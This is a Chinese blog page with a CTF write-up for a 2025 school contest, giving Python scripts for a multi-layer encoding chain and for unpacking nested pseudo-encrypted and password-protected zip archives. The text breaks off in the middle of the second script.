

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=light>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.jpg">
  <link rel="icon" href="/img/favicon.jpg">
  
    <link rel="canonical" href="https://www.dr0n.top/posts/806c3419/"/>
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="dr0n">
  <meta name="keywords" content="">
  
    <meta name="description" content="cryptoWe are Family! All the codes are familyDifficulty: Easy  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import base64, bin">
<meta property="og:type" content="article">
<meta property="og:title" content="2025校赛wp">
<meta property="og:url" content="https://www.dr0n.top/posts/806c3419/index.html">
<meta property="og:site_name" content="Dr0n&#39;s blog">
<meta property="og:description" content="cryptoWe are Family! All the codes are familyDifficulty: Easy  12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import base64, bin">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-2.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-1.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-3.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-4.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-5.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-6.png">
<meta property="og:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-7.png">
<meta property="article:published_time" content="2025-10-22T06:00:00.000Z">
<meta property="article:modified_time" content="2025-12-28T16:08:45.191Z">
<meta property="article:author" content="dr0n">
<meta property="article:tag" content="wp">
<meta property="article:tag" content="2025竞赛">
<meta property="article:tag" content="校赛">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://www.dr0n.top/img/wp/2025/xiaosai-2.png">
  
  
  
  <title>2025校赛wp - Dr0n&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=G-456TDFZC89", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', 'G-456TDFZC89');
        });
      }
    </script>
  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
</head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 60vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Dr0n&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>时间轴</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://awd.dr0n.top/" target="_self">
                <i class="iconfont icon-docker"></i>
                <span>awd</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item dropdown">
              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <i class="iconfont icon-codepen-fill"></i>
                <span>tools</span>
              </a>
              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
                
                  
                  
                  
                  <a class="dropdown-item" href="https://dr0n1.github.io/CyberChef/" target="_self">
                    
                    <span>CyberChef</span>
                  </a>
                
                  
                  
                  
                  <a class="dropdown-item" href="https://dr0n1.github.io/emoji-aes/" target="_self">
                    
                    <span>emoji-aes</span>
                  </a>
                
              </div>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/fluid-bg.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="2025校赛wp"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        dr0n
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-22 14:00" pubdate>
          2025年10月22日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.7k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          32 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">2025校赛wp</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="We-are-Family"><a href="#We-are-Family" class="headerlink" title="We are Family!"></a>We are Family!</h2><blockquote>
<p>All the codes are family<br>Difficulty: Easy</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, binascii<br><br>s = <span class="hljs-string">&quot;&quot;&quot;xxxx&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 1) base36 -&gt; bytes -&gt; emoji 文本</span><br>n = <span class="hljs-built_in">int</span>(s, <span class="hljs-number">36</span>)<br>b = n.to_bytes((n.bit_length()+<span class="hljs-number">7</span>)//<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>emoji_text = b.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1:&quot;</span>, emoji_text)<br><br><span class="hljs-comment"># 2) emoji -&gt; hex</span><br>order = <span class="hljs-built_in">sorted</span>(<span class="hljs-built_in">set</span>(emoji_text))<br>emap = &#123;emj: <span class="hljs-built_in">format</span>(i, <span class="hljs-string">&#x27;x&#x27;</span>) <span class="hljs-keyword">for</span> i, emj <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(order)&#125;<br>hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join(emap[ch] <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> emoji_text)<br>data = binascii.unhexlify(hex_str)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2:&quot;</span>, data)<br><br><span class="hljs-comment"># 3) Ascii85</span><br>a85 = base64.a85decode(data.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3:&quot;</span>, a85)<br><br><span class="hljs-comment"># 4) Base64</span><br>b64 = base64.b64decode(a85)<br>s2  = b64.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4:&quot;</span>, s2)<br><br><span class="hljs-comment"># 5) Base91 解码</span><br>alphabet91 = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;~\&quot;&quot;</span><br>d = &#123;c:i <span class="hljs-keyword">for</span> i,c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alphabet91)&#125;<br>v=-<span class="hljs-number">1</span>; b=<span class="hljs-number">0</span>; nbits=<span class="hljs-number">0</span>; out=<span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s2:<br>    <span class="hljs-keyword">if</span> ch <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> d: <span class="hljs-keyword">continue</span><br>    c=d[ch]<br>    <span class="hljs-keyword">if</span> v&lt;<span class="hljs-number">0</span>: v=c<br>    <span class="hljs-keyword">else</span>:<br>        v+=c*<span class="hljs-number">91</span>; b|=v&lt;&lt;nbits; nbits+=<span class="hljs-number">13</span> <span class="hljs-keyword">if</span> (v&amp;<span class="hljs-number">8191</span>)&gt;<span class="hljs-number">88</span> <span class="hljs-keyword">else</span> <span class="hljs-number">14</span><br>        <span class="hljs-keyword">while</span> nbits&gt;<span class="hljs-number">7</span>:<br>            out.append(b&amp;<span class="hljs-number">0xFF</span>); b&gt;&gt;=<span class="hljs-number">8</span>; nbits-=<span class="hljs-number">8</span><br>        v=-<span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> v+<span class="hljs-number">1</span>: out.append((b | v&lt;&lt;nbits)&amp;<span class="hljs-number">0xFF</span>)<br>s3 = out.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;5:&quot;</span>, s3)<br><br><span class="hljs-comment"># 6) Base58</span><br>alphabet58 = <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span><br>m58 = &#123;c:i <span class="hljs-keyword">for</span> i,c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(alphabet58)&#125;<br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s3: num = num*<span class="hljs-number">58</span> + m58[ch]<br>b58 = num.to_bytes((num.bit_length()+<span class="hljs-number">7</span>)//<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>s4 = b58.decode(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;6:&quot;</span>, s4)<br><br><span class="hljs-comment"># 7) Base62</span><br>alphabet62 = <span class="hljs-string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span><br>num=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> s4: num = num*<span class="hljs-number">62</span> + alphabet62.index(ch)<br>b62 = num.to_bytes((num.bit_length()+<span class="hljs-number">7</span>)//<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;big&#x27;</span>)<br>s5 = b62.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;7:&quot;</span>, s5)<br><br><span class="hljs-comment"># 8) Base32</span><br>pad = <span class="hljs-string">&#x27;=&#x27;</span> * ((<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(s5)%<span class="hljs-number">8</span>) % <span class="hljs-number">8</span>)<br>flag = base64.b32decode(s5 + pad).decode()<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>



<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="CompressionLab"><a href="#CompressionLab" class="headerlink" title="CompressionLab"></a>CompressionLab</h2><blockquote>
<p>Zip files are a fundamental component of the system.<br>Difficultly: Normal</p>
</blockquote>
<p>伪加密的压缩包和真加密的压缩包多层嵌套，如果是真加密则使用内层压缩包的文件名作为密码</p>
<p>解压到最后得到<code>Hint: The flag is encoded in binary, try to find it.</code></p>
<p>一共336层，8位一组刚好42组，将伪加密的层变为0，真加密的层为1，转字符串得到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> suppress<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">List</span>, <span class="hljs-type">Optional</span><br><br><br>PK_CENTRAL = <span class="hljs-string">b&quot;PK\x01\x02&quot;</span><br>ZIP_FILE = Path(<span class="hljs-string">&quot;dc7f41a02c1eb2ecb0f1b10a79e2ea20.zip&quot;</span>)<br>LAYERS_ROOT = Path(<span class="hljs-string">&quot;layers&quot;</span>)<br><br><br><span class="hljs-comment"># 判断给定 ZIP 是否属于伪加密</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_pseudo_encrypted</span>(<span class="hljs-params">zp: Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">can_read_any_member</span>(<span class="hljs-params">source</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(source, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>            <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> zf.infolist():<br>                <span class="hljs-keyword">if</span> info.is_dir():<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">with</span> zf.<span class="hljs-built_in">open</span>(info) <span class="hljs-keyword">as</span> fh:<br>                    fh.read(<span class="hljs-number">1</span>)<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">with</span> suppress(Exception):<br>        <span class="hljs-keyword">if</span> can_read_any_member(zp):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    data = <span class="hljs-built_in">bytearray</span>(zp.read_bytes())<br>    flag_offset = -<span class="hljs-number">1</span><br>    search_from = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        idx = data.find(PK_CENTRAL, search_from)<br>        <span class="hljs-keyword">if</span> idx == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>        candidate = idx + <span class="hljs-number">8</span><br>        <span class="hljs-keyword">if</span> candidate &lt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> data[candidate] == <span class="hljs-number">0x01</span>:<br>            flag_offset = candidate<br>        search_from = idx + <span class="hljs-number">4</span><br><br>    <span class="hljs-keyword">if</span> flag_offset == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    data[flag_offset] = <span class="hljs-number">0x00</span><br>    <span class="hljs-keyword">with</span> suppress(Exception):<br>        <span class="hljs-keyword">return</span> can_read_any_member(BytesIO(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 处理伪加密 ZIP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_pseudo_encrypted</span>(<span class="hljs-params">zp: Path, outdir: Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    data = <span class="hljs-built_in">bytearray</span>(zp.read_bytes())<br>    flag_offset = -<span class="hljs-number">1</span><br>    search_from = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        idx = data.find(PK_CENTRAL, search_from)<br>        <span class="hljs-keyword">if</span> idx == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>        candidate = idx + <span class="hljs-number">8</span><br>        <span class="hljs-keyword">if</span> candidate &lt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> data[candidate] == <span class="hljs-number">0x01</span>:<br>            flag_offset = candidate<br>        search_from = idx + <span class="hljs-number">4</span><br><br>    <span class="hljs-keyword">if</span> flag_offset != -<span class="hljs-number">1</span>:<br>        data[flag_offset] = <span class="hljs-number">0x00</span><br>        source = BytesIO(data)<br>    <span class="hljs-keyword">else</span>:<br>        source = zp<br><br>    <span class="hljs-keyword">with</span> suppress(Exception):<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(source, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>            zf.extractall(outdir)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># 处理真加密 ZIP</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_real_encrypted</span>(<span class="hljs-params">zp: Path, outdir: Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">with</span> zipfile.ZipFile(zp, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>        members = [info <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> zf.infolist() <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info.is_dir()]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> members:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    members.sort(key=<span class="hljs-keyword">lambda</span> info: (info.filename.count(<span class="hljs-string">&quot;/&quot;</span>), <span class="hljs-built_in">len</span>(info.filename)))<br><br>    password: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">str</span>] = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> members:<br>        name = Path(info.filename).name<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>            <span class="hljs-keyword">continue</span><br>        candidate = Path(name).stem <span class="hljs-keyword">if</span> name.lower().endswith(<span class="hljs-string">&quot;.zip&quot;</span>) <span class="hljs-keyword">else</span> name<br>        <span class="hljs-keyword">if</span> password <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            password = candidate<br>        <span class="hljs-keyword">if</span> name.lower().endswith(<span class="hljs-string">&quot;.zip&quot;</span>):<br>            password = candidate<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> password:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">with</span> suppress(Exception):<br>        <span class="hljs-keyword">with</span> zipfile.ZipFile(zp, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> zf:<br>            zf.extractall(outdir, pwd=password.encode())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    bits: <span class="hljs-type">List</span>[<span class="hljs-built_in">str</span>] = []<br>    current = ZIP_FILE.resolve()<br>    level = <span class="hljs-number">0</span><br><br>    LAYERS_ROOT.mkdir(exist_ok=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n正在处理第 <span class="hljs-subst">&#123;level&#125;</span> 层：<span class="hljs-subst">&#123;current&#125;</span>&quot;</span>)<br>        layer_dir = LAYERS_ROOT / <span class="hljs-string">f&quot;layer_<span class="hljs-subst">&#123;level&#125;</span>&quot;</span><br>        layer_dir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> is_pseudo_encrypted(current):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;伪加密&quot;</span>)<br>            succeeded = extract_pseudo_encrypted(current, layer_dir)<br>            bit = <span class="hljs-string">&quot;0&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;真加密&quot;</span>)<br>            succeeded = extract_real_encrypted(current, layer_dir)<br>            bit = <span 